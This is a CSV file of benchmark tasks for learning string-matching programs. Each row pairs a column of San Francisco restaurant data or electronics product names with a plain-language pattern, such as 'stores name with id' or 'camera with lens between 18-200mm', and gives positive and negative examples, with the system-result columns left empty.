bid,database,table,column,task,train-positive,train-negative,test-positive,test-negative,GPT-3.5-exec-precision,GPT-3.5-exec-recall,GPT-3-exec-precision,GPT-3-exec-recall,FlashGPT-precision,FlashGPT-recall,FlashGPT-program,FlashGPT-time,FlashGPT-#ex,GPT-3.5-regex-precision,GPT-3.5-regex-recall,GPT-3.5-regex-program,GPT-3.5-regex-time,GPT-3.5-regex-#sample,GPT-3.5-synth-precision,GPT-3.5-synth-recall,GPT-3.5-synth-time,GPT-3.5-synth-program,GPT-3.5-synth-#sample,GPT-3-synth-precision,GPT-3-synth-recall,GPT-3-synth-time,GPT-3-synth-program,Smore-precision,Smore-recall,Smore-program,Smore-time,Smore-no-type-precision,Smore-no-type-recall,Smore-no-type-program,Smore-no-type-time,Smore-no-type-system-precision,Smore-no-type-system-recall,Smore-no-type-system-program,Smore-no-type-system-time,Smore-no-decomp-precision,Smore-no-decomp-recall,Smore-no-decomp-program,Smore-no-decomp-time,Smore-no-repair-precision,Smore-no-repair-recall,Smore-no-repair-program,Smore-no-repair-time,Smore-no-repair-#sample,Smore-no-sketch-precision,Smore-no-sketch-recall,Smore-no-sketch-program,Smore-no-sketch-time
1,sf-restaurants,business,Owner City,name and abbreviation for cities in California,"Daly City
San Francisco
S.F.","DEERFIELD
Seattle
Day City","Yountville
South Pasadena
SAN CARLOS
Vacaville
Mill Valley
Dublin
Burlingame
Hercules
Sf.
Redlands","Ponte Vedra Beach
        WINTER PARK
Honolulu
El Sobrante
94117
Tiburon
San Frfancisco
ALPHARETTA
        DANVILLE
SANF FRANCISCO",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2,sf-restaurants,business,Owner City,City name with at least one captial letter,"Wyomissing
Boca Raton
Milbrae","deerfield
94608
san francisco","Barringtron
Vallejo
Ripon
Woonsocket
Honolulu
Chicago
MALIBU
Lodi
DEERFIELD
CHARLOTTE","Filbert St.
San Francisc0o
irvine
SAN FRANICSCO
PO Box 901, Deerfield
PURCHASE
hayward
Diamond St.
Brunswich St
dublin",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3,sf-restaurants,business,Owner Name,name in the form of [Company name] / [Owner name],"Indigo Pie, LLC / Michael Whang
1234 Polk St., Inc. / Ibrahim M. Al Haj
Andersen America, Inc. / Nobumitsu Kobayashi and Tad Saito","100 Brannan LLC
AAA Vegi, Inc
ALEX MIRETSKY","12 Tribes Kosher Foods, Inc. / Rebecca Joseph
Crepe & Brioche, Inc. / Catherine Bunand
Gaucho's Table, LLC / Ruben Gamundi
Pacific Retail VFC 1, Inc. / Michael J. Pollastro, CEO
La Mediterranee I, Inc. / Levon Der Bedrossian, Vanick Der Bedrossian
YMCA of San Francisco / Kari Lee, Exec. Director
The Park SF, LLC / David Stanton, Anna Weinberg
Joe's Union L.P. / Patricia Herman, John Duggan, Elena Duggan
Fresco Pizza and Grill, Inc. / Belarbi Abdelghani
John's Grill Inc. / John Konstin","NIDAL S. NAZZAL & YUSEF NAZZAL
SAFEWAY CORP., PETER MCGOWAN
Red Lantern SF LLC
License To Spill, Inc
790 Bush St. Ventures, Inc.  Roger Abuyaghi
Kawthar, Inc
TWENTY-SIX SHOTS, INC
Sunrise Irving Market Inc
The Dry Dock Corp   Peter O'Leary
JASER S. YACOUB & RAMI S. JASE",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
4,sf-restaurants,business,Name,stores name with id,"24 HOUR FITNESS, INC. #547
7 Eleven #2366-24139C
BURGER KING 4525","1601 Bar & Kitchen
24 Hour Fitness, Inc
AT&T - DOGGIE DINER room 3228 [145164]","Subway #27657
7-Eleven Store 2231-33429A
Walgreens #3185
Subway Sandwiches #27662
Big Joe's Broiller #2
AFC Sushi @ Safeway #985
Baysubway 02
SERRANO'S PIZZA II
LA LOMA PRODUCE #7
SEE'S CANDIES, Inc. #34","WILDLIFE CONNECTION ESPRESSO CART
AT&T - DOGGIE DINER room 3228 [145164]
Beso Bistronomia
Friendship Market
AT&T - (CART 2)  DELI [145090]
AT&T - CABLE CAR BAR (VIEW) [146519]
T P SEAFOOD & MEAT CO. INC.
MEALS ON WHEELS OF SF, INC.
AT&T - DERBY GRILL room 2103 [145171]
Benjarong Thai Cuisine",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
5,sf-restaurants,business,Name,Market with street name ,"17TH & COLE MARKET
2227 Irving Seafood Market
Clement Street Farmers Market","A B C MARKET
Mr. & Mrs. Tea House LLC
Corner Bakery Cafe #1584","The Market On Market
Presidio Foodmart
Bernal Heights Market
Clement Mini Market
California & Lyon Market
Fort Mason Market and Deli
Green & Polk Produce
23rd & Guerrero Market & Deli
50 Fremont Farmers Market
22ND & IRVING MARKET","The Secret Wine Shop
Ana's Market
HEALTHY SPIRITS
PARAGON RESTAURANT & BAR
MEZES RESTAURANT
LUCCA FOOD & WINE SHOP
Martha & Bros. Coffee Co
A&M LIQUOR
Vegiland Market, Inc.
Kingdom of Dumpling",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
6,sf-restaurants,business,Name,Restaurant that are named after a person,"Sally Restaurant and Deli
ANDERSEN BAKERY
Alice Chinese Bistro","NORDSTROM CAFE BISTRO
ALMA'S CIGARETTES
Alice Chalmers Club House (CACFP)","JJardine Catering & Events
Ho's Bootleg Tavern
PASITA'S BAKERY
KITARO JAPANESE RESTAURANT
JIM'S RESTAURANT
Annie's Hot Dogs
Anthony's Cookies
ADELITA'S CAKES
Akiko's Sushi Bar
David's Deli & Bistro","NEW ERITREA RESTAURANT
MARINA SUPER
LUCCA FOOD & WINE SHOP
Legend Billiard Hall
Mr. & Mrs. Tea House LLC
Corner Bakery Cafe #1584
Glaze Donuts
Club Kristi
Aguila De Oro
AT&T Park - Food Cart P2",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
7,sf-restaurants,business,Day of Application Date,Restaurant that are created before 2000 or after 2010,"1999-12-28 00:00:00
2010-01-05 00:00:00
2012-04-02 00:00:00","2000-02-15 00:00:00
2003-10-01 00:00:00
2005-07-22 00:00:00","2016-05-25 00:00:00
2016-04-07 00:00:00
1999-05-19 00:00:00
2013-02-04 00:00:00
2014-06-04 00:00:00
2014-10-07 00:00:00
2015-05-20 00:00:00
2014-06-16 00:00:00
1995-01-05 00:00:00
1997-12-02 00:00:00","2006-07-14 00:00:00
2002-08-05 00:00:00
2009-05-26 00:00:00
2005-03-15 00:00:00
2000-04-26 00:00:00
2003-11-03 00:00:00
2008-01-03 00:00:00
2007-06-22 00:00:00
2004-07-29 00:00:00
2005-05-12 00:00:00",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
8,plugs-electronics,hands_on_lab_data,Product Name,All intel computer that has more than 8 GB memory,"264-27"" iMac® with Retina 5K display   Intel Core i5 (3.2GHz)   8GB Memory
436-Star Wars Special Edition 15.6"" Laptop   Intel Core i7   8GB Memory
268-ENVY Desktop   Intel Core i7   16GB Memory","285-Slimline Desktop   Intel Pentium   4GB Memory
283-Desktop   AMD A10 Series
112-iPhone 6s Plus 64GB   Gold (AT&T)","274-IdeaCentre 300s Desktop   Intel Core i5   8GB Memory
281-Pavilion Desktop   Intel Core i3   8GB Memory
286-Envy Desktop   Intel Core i5   8GB Memory
266-Pavillion Desktop   Intel Core i7   8GB Memory","958-Galaxy S6 edge+ 4G LTE with 32GB Memory Cell Phone   Black Sapphire (Verizon Wireless)
262-ENVY 27Touch Screen All In
270-Pavilion 23Touch Screen All In
438-11.6"" Chromebook 2   Intel Celeron   2GB Memory
435-MacBook®   12"" Display   Intel Core M
401-MacBook Air® (Latest Model)   13.3"" Display   Intel Core i5
427-G50 15.6"" Laptop   Intel Core i3   4GB Memory
419-Yoga 2 2 in 1 11.6Touch
409-MacBook®   12"" Display   Intel Core M
414-Inspiron 13.3Touch Screen Laptop   Intel Core i5",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9,plugs-electronics,hands_on_lab_data,Product Name,All At&T or Verizon phone that has more than 32 GB memory,"101-Galaxy Note5 4G LTE with 32GB Memory Cell Phone   Black Sapphire (AT&T)
969-iPhone 6s Plus 128GB   Gold (Verizon Wireless)
150-Galaxy S6 4G with 64GB Memory Cell Phone   White Pearl (AT&T)","141-iPhone 6 Plus 16GB   Space Gray (AT&T)
114-Gear S Smartwatch 40mm Chrome AT&T   Black Urethane
923-iPhone 6 16GB   Silver (Verizon Wireless)","944-iPhone 6s 64GB   Gold (Verizon Wireless)
921-iPhone 6s Plus 64GB   Space Gray (Verizon Wireless)
140-Galaxy S6 edge 4G with 32GB Memory Cell Phone   Black Sapphire (AT&T)
150-Galaxy S6 4G with 64GB Memory Cell Phone   White Pearl (AT&T)
103-iPhone 6s 64GB   Space Gray (AT&T)
945-iPhone 6s 64GB   Silver (Verizon Wireless)
980-Galaxy S6 edge 4G LTE with 64GB Memory Cell Phone   Black Sapphire (Verizon Wireless)
973-iPhone 6s Plus 128GB   Space Gray (Verizon Wireless)
936-iPhone 6s 64GB   Rose Gold (Verizon Wireless)
955-V10 4G with 64GB Memory Cell Phone   Black (Verizon Wireless)","896-Galaxy S6 edge with 64GB Memory Cell Phone   White (Sprint)
897-iPhone 6 Plus 64GB   Gold (Sprint)
859-iPhone 6 64GB   Space Gray (Sprint)
899-Desire 510 Cell Phone   Deep Navy Blue (Sprint)
118-iPhone 6s 16GB   Gold (AT&T)
883-Galaxy S6 4G LTE with 32GB Memory Cell Phone   Black (T Mobile)
857-iPhone 6s 16GB   Gold (Sprint)
886-iPhone 6 Plus 16GB   Gold (Sprint)
895-iPhone 6s Plus 128GB   Silver (Sprint)
139-Gear S Smartwatch 40mm Chrome AT&T   White Urethane",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
10,plugs-electronics,hands_on_lab_data,Product Name,All camera with lens between 18-200mm,"799-D3300 DSLR Camera with 18-55 mm VR Lens
785-EOS T6i DSLR Camera with EF S 18-55 mm STM Lens Video Creator Kit
530-EOS 70D DSLR Camera with EF S 18-135mm STM Lens Video Creator Kit","500-EF 75–300 mm f/4–5.6 III Telephoto Zoom Lens
505-EF 35 mm f/2 IS USM Wide Angle Lens
552-AF S DX NIKKOR 18-300 mm f/3.5","780-D3300 DSLR Camera with 18-55 mm VR Lens
536-EOS 5D Mark III DSLR Camera with 24-70 mm f/4L IS Lens
800-D3200 DSLR Camera with 18-55 mm VR II and 55-200 mm VR II Lenses
792-D5300 DSLR Camera with 18-55 mm VR Lens
777-Bundle EOS Rebel T5i with EF S 18-55 mm IS STM Kit
778-D3200 DSLR Camera with 18-55 mm VR Lens
787-EOS Rebel T5i DSLR Camera with 18-135 mm IS STM Lens
537-D5300 DSLR Camera with 18-55 mm VR Lens
527-D7200 DSLR Camera with 18-140 mm Lens
530-EOS 70D DSLR Camera with EF S 18 135mm STM Lens Video Creator Kit","679-PowerShot G7 X 20.2 Megapixel Digital Camera
557-EF 17-40 mm f/4L USM Ultra Wide Zoom Lens
659-Snap 10.0 Megapixel Digital Camera
520-FE 28 mm f/2 E Mount Prime Lens
555-AF S DX Micro NIKKOR 40 mm f/2.8G Macro Lens
556-Sonnar T FE 55 mm f/1.8 ZA Lens for Most Sony a7 Series Cameras
796-D5300 DSLR Camera (Body Only)
499-EF S 24 mm f/2.8 STM Standard Lens for Canon APS C Cameras
521-35 mm f/1.8 Prime Lens for Most NEX E Mount Cameras
542-D5300 DSLR Camera (Body Only)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
